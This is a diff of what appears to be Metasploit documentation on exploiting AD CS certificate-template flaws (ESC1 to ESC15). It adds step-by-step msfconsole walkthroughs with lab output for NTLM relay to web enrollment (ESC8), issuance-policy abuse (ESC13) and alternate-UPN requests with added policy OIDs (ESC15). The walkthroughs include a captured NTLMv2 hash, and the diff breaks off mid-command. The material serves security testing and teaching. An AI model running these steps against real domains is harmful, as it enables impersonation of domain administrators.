@@ -5,20 +5,56 @@ for testing purposes.
 # Introduction to AD CS Vulnerabilities
 ```mermaid
 flowchart TD
-	escexp[Find vulnerable certificate templates\nvia ldap_esc_vulnerable_cert_finder] --> icpr[Issue certificates via icpr_cert]
-	icpr[Issue certificates via icpr_cert] --> ESC1{{ESC1}}
-	ESC1{{ESC1}} -- Via PKINIT --> pkinit{Authenticate to Kerberos}
-	icpr[Issue certificates via icpr_cert] --> users[Request certificates on behalf of other users]
-	users[Request certificates on behalf of other users] --> ESC2{{ESC2}}
-	users[Request certificates on behalf of other users] --> ESC3{{ESC3}}
-	ESC2{{ESC2}} -- Via PKINIT --> pkinit[Authenticate to Kerberos]
-	ESC3{{ESC3}} -- Via PKINIT --> pkinit[Authenticate to Kerberos]
-	ad_cs_template[Reconfigure certificates via ad_cs_cert_template] -- Exploit configuration --> icpr
+    subgraph ad_cs_cert_templates[<b>ad_cs_cert_templates</b>]
+        ESC4(ESC4)
+        update_template[<i>Update Template</i>]
+        ESC4 -- abuse privileges --> update_template
+    end
+    subgraph relay/esc8[<b>relay/esc8</b>]
+        ESC8(ESC8)
+        ESC8 --> web_enrollment[<i>Issuance via Web Enrollment</i>]
+    end
+    subgraph icpr_cert[<b>icpr_cert</b>]
+        ESC1(ESC1)
+        ESC2(ESC2)
+        ESC3(ESC3)
+        ESC13(ESC13)
+        ESC15(ESC15)
+        alt_subject[<i>Alternate Subject Issuance</i>]
+        add_policies[<i>Alternate Subject Issuance</i><br>and<br><i>Add Policy OIDs</i>]
+        as_eagent[<i>Enrollment Agent Issuance</i>]
+        normal[<i>Normal Issuance</i>]
+
+        ESC1 --> alt_subject
+        ESC2 --> as_eagent
+        ESC3 --> as_eagent
+        ESC13 --> normal
+        ESC15 --> add_policies
+        as_eagent -- use new certificate --> normal
+    end
+    subgraph kerberos/get_ticket[<b>kerberos/get_ticket</b>]
+        PKINIT[<i>PKINIT</i>]
+    end
+    subgraph ldap/ldap_login[<b>ldap/ldap_login</b>]
+        SCHANNEL[<i>SCHANNEL</i>]
+    end
+    subgraph ldap_esc_vulnerable_cert_finder[<b>ldap_ecs_vulnerable_cert_finder</b>]
+        find_vulnerable_templates[<i>Find Vulnerable Templates</i>]
+    end
+    add_policies -- add client authentication oid --> SCHANNEL
+    add_policies -- add certificate request agent oid --> as_eagent
+    alt_subject --> PKINIT
+    alt_subject --> SCHANNEL
+    find_vulnerable_templates --> icpr_cert
+    normal --> PKINIT
+    normal --> SCHANNEL
+    update_template --> ESC1
+    web_enrollment --> PKINIT
+    web_enrollment --> SCHANNEL
 ```
 
-The chart above showcases how one can go about attacking four common AD CS
-vulnerabilities, taking advantage of various flaws in how certificate templates are
-configured on an Active Directory Certificate Server.
+The chart above showcases how one can go about attacking each of the AD CS vulnerabilities supported by Metasploit,
+taking advantage of various flaws in how certificate templates are configured on an Active Directory Certificate Server.
 
 The following sections will walk through each of these steps, starting with enumerating
 certificate templates that the server has to offer and identifying those that are
@@ -30,8 +66,7 @@ administrator via Kerberos.
 Each certificate template vulnerability that will be discussed here has a ESC code, such
 as ESC1, ESC2. These ESC codes are taken from the original whitepaper that
 SpecterOps published which popularized these certificate template attacks, known as
-[Certified
-Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).
+[Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).
 In this paper Will Schroeder and Lee Christensen described 8 different domain escalation
 attacks that they found they could conduct via misconfigured certificate templates:
 
@@ -51,30 +86,38 @@ attacks that they found they could conduct via misconfigured certificate templat
   Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates
 - ESC7 - Vulnerable Certificate Authority Access Control
 - ESC8 - NTLM Relay to AD CS HTTP Endpoints
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc8]]
 
-Later, another
-[blog](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
-came out from Oliver Lyak which discovered ESC9 and ESC10, two more vulnerabilities that
-could allow normal domain joined users to abuse certificate template misconfigurations to
-gain domain administrator privileges.
+Later, additional techniques were disclosed by security researchers:
 
-- ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in
-  `msPKI-EnrollmentFlag`. Also `StrongCertificateBindingEnforcement` not set to 2 or
-  `CertificateMappingMethods` contains `UPN` flag.
-- ESC10 - Weak Certificate Mappings -
-  `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel
-  CertificateMappingMethods` contains `UPN` bit aka `0x4` or
-  `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement` is set to `0`.
+- ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in `msPKI-EnrollmentFlag`. Also
+  `StrongCertificateBindingEnforcement` not set to 2 or `CertificateMappingMethods` contains `UPN` flag.
+  - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
+    more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+- ESC10 - Weak Certificate Mappings - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel
+  CertificateMappingMethods` contains `UPN` bit aka `0x4` or `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
+  StrongCertificateBindingEnforcement` is set to `0`.
+  - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
+    more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+- ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of
+  the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
+  - [Relaying to AD Certificate Services over
+    RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
+- ESC12 - A user with shell access to a CA server using a YubiHSM2 hardware security module can access the CA's private
+  key.
+  - [Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
+- ESC13 - Domain escalation via issuance policies with group links.
+  - [ADCS ESC13 Abuse Technique](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc13]]
+- ESC14 - Explicit certificate mappings through `altSecurityIdentities` write access abuse
+  - [ADCS ESC14 Abuse Technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
+- ESC15 (AKA EKUwu) - Domain escalation via No Issuance Requirements + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Policy OID
+  manipulation
+  - [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc15]]
 
-Finally, we have ESC11, which was discovered by Compass Security and described in their
-[blog
-post](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
-
-- ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC
-  interface is allowed due to lack of the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
-
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, and ESC4. As such,
-this page only covers exploiting ESC1 to ESC4 at this time.
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC13 and ESC15. As such, this page only
+covers exploiting that subset of ESC flaws.
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -134,7 +177,9 @@ Domain Controller (DC), and will run a set of LDAP queries to gather a list of c
 templates they make available for enrollment. It will then also query the permissions on both the CA and the certificate template to figure out
 which users or groups can use that certificate template to elevate their privileges.
 
-At this time, the module is capable of identifying techniques ESC1 through ESC3.
+Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC13 and ESC15. The
+module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by
+analyzing the objects in LDAP.
 
 Keep in mind though that there are two sets of permissions in play here though. There is one set of permissions on the CA server that control
 who is able to enroll in any certificate template from that server, and second set of permissions that control who is allowed to enroll in
@@ -167,17 +212,19 @@ msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > show options
 
 Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):
 
-   Name                  Current Setting  Required  Description
-   ----                  ---------------  --------  -----------
-   BASE_DN                                no        LDAP base DN if you already have it
-   DOMAIN                                 no        The domain to authenticate to
-   PASSWORD                               no        The password to authenticate with
-   REPORT_NONENROLLABLE  false            yes       Report nonenrollable certificate templates
-   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit
-                                                    -framework/wiki/Using-Metasploit
-   RPORT                 389              yes       The target port
-   SSL                   false            no        Enable SSL on the LDAP connection
-   USERNAME                               no        The username to authenticate with
+   Name                   Current Setting  Required  Description
+   ----                   ---------------  --------  -----------
+   BASE_DN                                 no        LDAP base DN if you already have it
+   DOMAIN                                  no        The domain to authenticate to
+   PASSWORD                                no        The password to authenticate with
+   REPORT_NONENROLLABLE   false            yes       Report nonenrollable certificate templates
+   REPORT_PRIVENROLLABLE  false            yes       Report certificate templates restricted to domain
+                                                      and enterprise admin
+   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit
+                                                     -framework/wiki/Using-Metasploit
+   RPORT                  389              yes       The target port
+   SSL                    false            no        Enable SSL on the LDAP connection
+   USERNAME                                no        The username to authenticate with
 
 
 View the full module info with the info, or info -d command.
@@ -195,114 +242,81 @@ msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 
 [*] Discovering base DN automatically
 [+] 172.30.239.85:389 Discovered base DN: DC=daforest,DC=com
-[*] Template: SubCA
-[*]    Distinguished Name: CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC1, ESC2, ESC3_TEMPLATE_2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: ESC1-Template
-[*]    Distinguished Name: CN=ESC1-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC1
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: ESC2-Template
-[*]    Distinguished Name: CN=ESC2-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: ESC3-Template1
-[*]    Distinguished Name: CN=ESC3-Template1,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC3_TEMPLATE_1
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: User
-[*]    Distinguished Name: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC3_TEMPLATE_2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: Administrator
-[*]    Distinguished Name: CN=Administrator,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC3_TEMPLATE_2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: Machine
-[*]    Distinguished Name: CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC3_TEMPLATE_2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-515 (Domain Computers)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: DomainController
-[*]    Distinguished Name: CN=DomainController,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC3_TEMPLATE_2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-498 (Enterprise Read-only Domain Controllers)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-516 (Domain Controllers)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]       * S-1-5-9 (Enterprise Domain Controllers)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
-[*] Template: ESC3-Template2
-[*]    Distinguished Name: CN=ESC3-Template2,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
-[*]    Vulnerable to: ESC3_TEMPLATE_2
-[*]    Certificate Template Enrollment SIDs:
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
-[*]       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
-[*]    Issuing CAs:
-[*]       * daforest-WIN-BR0CCBA815B-CA
-[*]          Server: WIN-BR0CCBA815B.daforest.com
-[*]          Enrollment SIDs:
-[*]             * S-1-5-11 (Authenticated Users)
+[+] Template: ESC1-Template
+[*]   Distinguished Name: CN=ESC1-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC1
+[*]   Notes: ESC1: Request can specify a subjectAltName (msPKI-Certificate-Name-Flag)
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
+[+]   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
+[+] Template: ESC2-Template
+[*]   Distinguished Name: CN=ESC2-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC2
+[*]   Notes: ESC2: Template defines the Any Purpose OID or no EKUs (PkiExtendedKeyUsage)
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
+[+]   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
+[+] Template: ESC3-Template1
+[*]   Distinguished Name: CN=ESC3-Template1,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC3_TEMPLATE_1
+[*]   Notes: ESC3: Template defines the Certificate Request Agent OID (PkiExtendedKeyUsage)
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
+[+]   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
+[+] Template: User
+[*]   Distinguished Name: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC3_TEMPLATE_2
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
+[+]   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
+[+] Template: Machine
+[*]   Distinguished Name: CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC3_TEMPLATE_2
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-515 (Domain Computers)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
+[+]   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
+[+] Template: ESC3-Template2
+[*]   Distinguished Name: CN=ESC3-Template2,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC3_TEMPLATE_2
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
+[*]     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
+[+]   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
 [*] Auxiliary module execution completed
 msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) >
 ```
@@ -857,6 +871,218 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
 
 At this point the certificate template's configuration has been restored and the operator has a certificate that can be
 used to authenticate to Active Directory as the Domain Admin.
+
+# Exploiting ESC8
+ESC8 leverages relaying NTLM authentication from an SMB server (running on Metasploit) to the HTTP(S) AD CS Web
+Enrollment portal running on a remote target. The attacker will need to coerce a client with privileges to authenticate
+to the target portal to authenticate to Metasploit instead. This can be achieved via a few techniques, including name
+poisoning via the `capture` plugin, coercion via the `auxiliary/scanner/dcerpc/petitpotam` module, or even a well placed
+UNC path. Once authentication has been relayed and an authorized HTTP session has been established, the attacker can
+query available certificate templates as well as issue them.
+
+Exploitation of this flaw is facilitated through the `auxiliary/server/relay/esc8` module which handles starting the SMB
+relay server and enables configuration of what happens when relaying is successful. Users can select from different
+operational "modes" via the MODE datastore option which controls what the module will do. For a full description, see
+the modules documentation. The default mode, "AUTO" will issue a User certificate if the relayed connection is for a
+user account or a Machine certificate if it's for a machine account. Once this certificate has been issued, it can be
+used for authentication. See the [Authenticating With A Certificate](#authenticating-with-a-certificate) section for
+more information.
+
+In the following example the AUTO mode is used to issue a certificate for the MSFLAB\smcintyre once they have
+authenticated.
+
+```msf
+msf6 auxiliary(server/relay/esc8) > set RELAY_TARGETS 172.30.239.85
+msf6 auxiliary(server/relay/esc8) > run
+[*] Auxiliary module running as background job 1.
+msf6 auxiliary(server/relay/esc8) > 
+[*] SMB Server is running. Listening on 0.0.0.0:445
+[*] Server started.
+[*] New request from 192.168.159.129
+[*] Received request for MSFLAB\smcintyre
+[*] Relaying to next target http://172.30.239.85:80/certsrv/
+[+] Identity: MSFLAB\smcintyre - Successfully authenticated against relay target http://172.30.239.85:80/certsrv/
+[SMB] NTLMv2-SSP Client     : 172.30.239.85
+[SMB] NTLMv2-SSP Username   : MSFLAB\smcintyre
+[SMB] NTLMv2-SSP Hash       : smcintyre::MSFLAB:821ad4c6b40475f4:07a6e0fd89d9af86a5b0e12d24915b4d:010100000000000071fe99aa0a27db01eabcbc6e8fcb6ed20000000002000c004d00530046004c00410042000100040044004300040018006d00730066006c00610062002e006c006f00630061006c0003001e00440043002e006d00730066006c00610062002e006c006f00630061006c00050018006d00730066006c00610062002e006c006f00630061006c000700080071fe99aa0a27db01060004000200000008003000300000000000000001000000002000004206ecc9e398d7766166f0f45d8bdcf7708c8f278f2cff1cc58017f9acf0f5400a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350039002e003100320038000000000000000000
+
+[*] Creating certificate request for MSFLAB\smcintyre using the User template
+[*] Generating CSR...
+[*] CSR Generated
+[*] Requesting relay target generate certificate...
+[+] Certificate generated using template User and MSFLAB\smcintyre
+[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=184&
+[+] Certificate for MSFLAB\smcintyre using template User saved to /home/smcintyre/.msf4/loot/20241025142116_default_172.30.239.85_windows.ad.cs_995918.pfx
+[*] Relay tasks complete; waiting for next login attempt.
+[*] Received request for MSFLAB\smcintyre
+[*] Identity: MSFLAB\smcintyre - All targets relayed to
+[*] New request from 192.168.159.129
+[*] Received request for MSFLAB\smcintyre
+[*] Identity: MSFLAB\smcintyre - All targets relayed to
+```
+
+# Exploiting ESC13
+To exploit ESC13, we need to target a certificate that has an issuance policy linked to a universal group in Active
+Directory. Unlike some of the other ESC techniques, successfully exploiting ESC13 isn't necessarily guaranteed to yield
+administrative privileges, rather the privileges that are gained are those of the group which is linked to by OID in the
+certificate template's issuance policy. The `auxiliary/gather/ldap_esc_vulnerable_cert_finder` module is capable of
+identifying certificates that meet the necessary criteria. When one is found, the module will include the group whose
+permissions will be included in the resulting Kerberos ticket in the notes section. In the following example, the
+ESC13-Test template is vulnerable to ESC13 and will yield a ticket including the ESC13-Group permissions.
+
+```
+msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+...
+[+] Template: ESC13-Test
+[*]   Distinguished Name: CN=ESC13-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=collalabs1,DC=local
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[+]   Vulnerable to: ESC13
+[*]   Notes: ESC13 groups: ESC13-Group
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-3474343397-3755413101-2031708755-512 (Domain Admins)
+[*]     * S-1-5-21-3474343397-3755413101-2031708755-513 (Domain Users)
+[*]     * S-1-5-21-3474343397-3755413101-2031708755-519 (Enterprise Admins)
+[+]   Issuing CA: collalabs1-SRV-ADDS01-CA (SRV-ADDS01.collalabs1.local)
+[*]     Enrollment SIDs:
+[*]       * S-1-5-11 (Authenticated Users)
+[*]       * S-1-5-21-3474343397-3755413101-2031708755-519 (Enterprise Admins)
+[*]       * S-1-5-21-3474343397-3755413101-2031708755-512 (Domain Admins)
+```
+
+In this case, the ticket can be issued with the `icpr_cert` module. No additional options are required to issue the
+certificate beyond the standard `CA`, `CERT_TEMPLATE`, target and authentication options.
+
+```
+msf6 > use auxiliary/admin/dcerpc/icpr_cert 
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+RHOSTS => 172.30.239.85
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+SMBDomain => COLLALABS1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+SMBPass => normalpass
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+CA => collalabs1-SRV-ADDS01-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC13-Test
+CERT_TEMPLATE => ESC13-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate Email: normaluser@collalabs1.local
+[*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3474343397-3755413101-2031708755-10051
+[*] 172.30.239.85:445 - Certificate UPN: normaluser@collalabs1.local
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20240226170310_default_172.30.239.85_windows.ad.cs_917878.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) with the `ESC13-Group`
+RID present in the Groups field of the TGT PAC.
+
+# Exploiting ESC15
+Steps for exploiting ESC15 are similar to ESC1 whereby a privileged user such as a domain admin is specified in the
+`ALT_UPN`. In addition to targeting another user, the certificate has additional Application Policy OIDs added to it
+which adjusts the context in which the issued certificate can be used. These policy OIDs are accepted by the issuing CA
+if the target certificate template is defined using schema version 1.
+
+In the following example, the Client Authentication OID (1.3.6.1.5.5.7.3.2) is added which enables the certificate to be
+used for authentication to LDAP via SCHANNEL. The operator can then perform LDAP queries with the privileges of the user
+specified in the alternate UPN.
+
+```msf
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+RHOSTS => 172.30.239.85
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+SMBDomain => COLLALABS1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+SMBPass => normalpass
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+CA => collalabs1-SRV-ADDS01-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+CERT_TEMPLATE => ESC15-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
+ADD_CERT_APP_POLICY => 1.3.6.1.5.5.7.3.2
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN administrator@collalabs1.local
+ALT_UPN => administrator@collalabs1.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
